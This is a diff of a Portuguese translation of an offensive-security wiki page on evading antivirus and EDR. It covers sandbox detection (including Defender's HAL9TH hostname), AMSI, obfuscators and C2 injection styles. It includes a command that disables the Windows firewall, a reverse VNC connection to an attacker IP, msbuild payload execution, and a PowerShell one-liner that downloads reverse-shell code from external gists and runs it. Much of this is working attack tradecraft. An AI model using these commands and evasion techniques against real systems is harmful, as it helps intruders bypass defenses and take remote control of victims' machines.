@@ -34,14 +34,14 @@ Recomendo fortemente que você confira esta [playlist do YouTube](https://www.yo
 A análise dinâmica é quando o AV executa seu binário em um sandbox e observa atividades maliciosas (por exemplo, tentando descriptografar e ler as senhas do seu navegador, realizando um minidump no LSASS, etc.). Esta parte pode ser um pouco mais complicada de trabalhar, mas aqui estão algumas coisas que você pode fazer para evadir sandboxes.
 
 - **Dormir antes da execução** Dependendo de como é implementado, pode ser uma ótima maneira de contornar a análise dinâmica do AV. Os AVs têm um tempo muito curto para escanear arquivos para não interromper o fluxo de trabalho do usuário, então usar longas pausas pode perturbar a análise de binários. O problema é que muitos sandboxes de AV podem simplesmente ignorar a pausa, dependendo de como é implementado.
-- **Verificando os recursos da máquina** Normalmente, os Sandboxes têm muito poucos recursos para trabalhar (por exemplo, < 2GB de RAM), caso contrário, poderiam desacelerar a máquina do usuário. Você também pode ser muito criativo aqui, por exemplo, verificando a temperatura da CPU ou até mesmo as velocidades do ventilador, nem tudo será implementado no sandbox.
+- **Verificando os recursos da máquina** Normalmente, os Sandboxes têm muito poucos recursos para trabalhar (por exemplo, < 2GB de RAM), caso contrário, poderiam desacelerar a máquina do usuário. Você também pode ser muito criativo aqui, por exemplo, verificando a temperatura da CPU ou até mesmo as velocidades dos ventiladores, nem tudo será implementado no sandbox.
 - **Verificações específicas da máquina** Se você quiser direcionar um usuário cuja estação de trabalho está unida ao domínio "contoso.local", você pode fazer uma verificação no domínio do computador para ver se corresponde ao que você especificou, se não corresponder, você pode fazer seu programa sair.
 
-Acontece que o nome do computador do Sandbox do Microsoft Defender é HAL9TH, então, você pode verificar o nome do computador no seu malware antes da detonação, se o nome corresponder a HAL9TH, significa que você está dentro do sandbox do Defender, então você pode fazer seu programa sair.
+Acontece que o nome do computador do Sandbox do Microsoft Defender é HAL9TH, então, você pode verificar o nome do computador no seu malware antes da detonação, se o nome corresponder a HAL9TH, significa que você está dentro do sandbox do defender, então você pode fazer seu programa sair.
 
 <figure><img src="../images/image (209).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>
 
-Algumas outras dicas realmente boas de [@mgeeky](https://twitter.com/mariuszbit) para ir contra Sandboxes
+Algumas outras dicas muito boas de [@mgeeky](https://twitter.com/mariuszbit) para ir contra Sandboxes
 
 <figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canal #malware-dev</p></figcaption></figure>
 
@@ -52,7 +52,7 @@ Por exemplo, se você quiser despejar o LSASS, **você realmente precisa usar mi
 A resposta certa é provavelmente a última. Tomando o mimikatz como exemplo, é provavelmente uma das, se não a mais sinalizada peça de malware pelos AVs e EDRs, enquanto o projeto em si é super legal, também é um pesadelo trabalhar com ele para contornar os AVs, então apenas procure alternativas para o que você está tentando alcançar.
 
 > [!NOTE]
-> Ao modificar seus payloads para evasão, certifique-se de **desativar a submissão automática de amostras** no Defender, e por favor, sério, **NÃO CARREGUE NO VIRUSTOTAL** se seu objetivo é alcançar a evasão a longo prazo. Se você quiser verificar se seu payload é detectado por um AV específico, instale-o em uma VM, tente desativar a submissão automática de amostras e teste lá até ficar satisfeito com o resultado.
+> Ao modificar seus payloads para evasão, certifique-se de **desativar a submissão automática de amostras** no defender, e por favor, sério, **NÃO CARREGUE NO VIRUSTOTAL** se seu objetivo é alcançar a evasão a longo prazo. Se você quiser verificar se seu payload é detectado por um AV específico, instale-o em uma VM, tente desativar a submissão automática de amostras e teste lá até que você esteja satisfeito com o resultado.
 
 ## EXEs vs DLLs
 
@@ -125,7 +125,7 @@ Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freez
 
 ## AMSI (Interface de Varredura Anti-Malware)
 
-AMSI foi criado para prevenir "[malware sem arquivo](https://en.wikipedia.org/wiki/Fileless_malware)". Inicialmente, os antivírus eram capazes de escanear **arquivos no disco**, então, se você conseguisse executar payloads **diretamente na memória**, o antivírus não poderia fazer nada para impedir, pois não tinha visibilidade suficiente.
+AMSI foi criado para prevenir "[malware sem arquivo](https://en.wikipedia.org/wiki/Fileless_malware)". Inicialmente, os AVs eram capazes de escanear **arquivos no disco**, então, se você conseguisse executar payloads **diretamente na memória**, o AV não poderia fazer nada para impedir, pois não tinha visibilidade suficiente.
 
 O recurso AMSI está integrado nesses componentes do Windows.
 
@@ -203,8 +203,8 @@ Existem várias ferramentas que podem ser usadas para **ofuscar código C# em te
 - [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz é um ofuscador de binários x64 que é capaz de ofuscar vários arquivos pe diferentes, incluindo: .exe, .dll, .sys
 - [**metame**](https://github.com/a0rtega/metame): Metame é um simples motor de código metamórfico para executáveis arbitrários.
 - [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator é um framework de ofuscação de código de grão fino para linguagens suportadas pelo LLVM usando ROP (programação orientada a retorno). ROPfuscator ofusca um programa no nível de código de montagem transformando instruções regulares em cadeias ROP, frustrando nossa concepção natural de fluxo de controle normal.
-- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt é um Crypter PE .NET escrito em Nim
-- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor é capaz de converter EXE/DLL existentes em shellcode e, em seguida, carregá-los
+- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt é um Crypter PE .NET escrito em Nim.
+- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor é capaz de converter EXE/DLL existentes em shellcode e, em seguida, carregá-los.
 
 ## SmartScreen & MoTW
 
@@ -265,13 +265,13 @@ A maioria das estruturas C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, 
 
 - **Fork\&Run**
 
-Isso envolve **gerar um novo processo sacrificial**, injetar seu código malicioso de pós-exploração nesse novo processo, executar seu código malicioso e, quando terminar, matar o novo processo. Isso tem seus benefícios e desvantagens. O benefício do método fork and run é que a execução ocorre **fora** do nosso processo de implante Beacon. Isso significa que se algo em nossa ação de pós-exploração der errado ou for pego, há uma **chance muito maior** de nosso **implante sobreviver.** A desvantagem é que você tem uma **maior chance** de ser pego por **Detecções Comportamentais**.
+Isso envolve **gerar um novo processo sacrificial**, injetar seu código malicioso de pós-exploração nesse novo processo, executar seu código malicioso e, quando terminar, matar o novo processo. Isso tem seus benefícios e desvantagens. O benefício do método fork and run é que a execução ocorre **fora** do nosso processo de implante Beacon. Isso significa que, se algo em nossa ação de pós-exploração der errado ou for pego, há uma **chance muito maior** de nosso **implante sobreviver.** A desvantagem é que você tem uma **maior chance** de ser pego por **Detecções Comportamentais**.
 
 <figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>
 
 - **Inline**
 
-Trata-se de injetar o código malicioso de pós-exploração **no seu próprio processo**. Dessa forma, você pode evitar ter que criar um novo processo e fazê-lo ser escaneado pelo AV, mas a desvantagem é que se algo der errado com a execução da sua carga útil, há uma **chance muito maior** de **perder seu beacon**, pois ele pode travar.
+Trata-se de injetar o código malicioso de pós-exploração **em seu próprio processo**. Dessa forma, você pode evitar ter que criar um novo processo e fazê-lo ser escaneado pelo AV, mas a desvantagem é que, se algo der errado com a execução de sua carga útil, há uma **chance muito maior** de **perder seu beacon**, pois ele pode travar.
 
 <figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>
 
@@ -292,15 +292,19 @@ O repositório indica: O Defender ainda escaneia os scripts, mas ao utilizar Go,
 
 A evasão é um tópico muito complicado, às vezes você tem que levar em conta muitas fontes diferentes de telemetria em apenas um sistema, então é praticamente impossível permanecer completamente indetectável em ambientes maduros.
 
-Cada ambiente que você enfrenta terá seus próprios pontos fortes e fracos.
+Cada ambiente contra o qual você se opõe terá seus próprios pontos fortes e fracos.
 
 Eu recomendo fortemente que você assista a esta palestra de [@ATTL4S](https://twitter.com/DaniLJ94), para ter uma base em técnicas de Evasão Avançada.
 
-{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}
+{{#ref}}
+https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
+{{#endref}}
 
 Esta também é outra ótima palestra de [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasão em Profundidade.
 
-{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}
+{{#ref}}
+https://www.youtube.com/watch?v=IbA7Ung39o4
+{{#endref}}
 
 ## **Técnicas Antigas**
 
@@ -319,14 +323,14 @@ Faça com que **inicie** quando o sistema for iniciado e **execute** agora:
 ```bash
 sc config TlntSVR start= auto obj= localsystem
 ```
-**Mudar a porta telnet** (furtivo) e desativar o firewall:
+**Mudar a porta telnet** (stealth) e desativar o firewall:
 ```
 tlntadmn config port=80
 netsh advfirewall set allprofiles state off
 ```
 ### UltraVNC
 
-Baixe-o de: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (você quer os downloads binários, não a instalação)
+Baixe-o de: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (você quer os downloads bin, não a instalação)
 
 **NO HOST**: Execute _**winvnc.exe**_ e configure o servidor:
 
@@ -334,11 +338,11 @@ Baixe-o de: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/do
 - Defina uma senha em _VNC Password_
 - Defina uma senha em _View-Only Password_
 
-Em seguida, mova o binário _**winvnc.exe**_ e o arquivo **recém** criado _**UltraVNC.ini**_ para dentro da **vítima**
+Em seguida, mova o binário _**winvnc.exe**_ e o arquivo **recém** criado _**UltraVNC.ini**_ dentro da **vítima**
 
 #### **Conexão reversa**
 
-O **atacante** deve **executar dentro** de seu **host** o binário `vncviewer.exe -listen 5900` para que ele esteja **preparado** para capturar uma **conexão VNC** reversa. Então, dentro da **vítima**: Inicie o daemon winvnc `winvnc.exe -run` e execute `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`
+O **atacante** deve **executar dentro** de seu **host** o binário `vncviewer.exe -listen 5900` para que esteja **preparado** para capturar uma **conexão VNC** reversa. Então, dentro da **vítima**: Inicie o daemon winvnc `winvnc.exe -run` e execute `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`
 
 **AVISO:** Para manter a furtividade, você não deve fazer algumas coisas
 
@@ -370,13 +374,13 @@ Agora **inicie o lister** com `msfconsole -r file.rc` e **execute** o **payload 
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 ```
-**O defensor atual encerrará o processo muito rapidamente.**
+**O defensor atual irá terminar o processo muito rapidamente.**
 
 ### Compilando nosso próprio reverse shell
 
 https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15
 
-#### Primeiro C# Revershell
+#### Primeiro Revershell em C#
 
 Compile-o com:
 ```
@@ -475,7 +479,9 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.g
 32bit:
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
 ```
-{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}
+{{#ref}}
+https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
+{{#endref}}
 
 Lista de ofuscadores C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)
 
@@ -492,7 +498,7 @@ i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sec
 - [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
 - [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)
 
-### Usando python para exemplo de construtores de injetores:
+### Usando python para construir exemplos de injetores:
 
 - [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)
 
@@ -524,6 +530,5 @@ https://github.com/praetorian-code/vulcan
 ### Mais
 
 - [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)
-
 
 {{#include ../banners/hacktricks-training.md}}
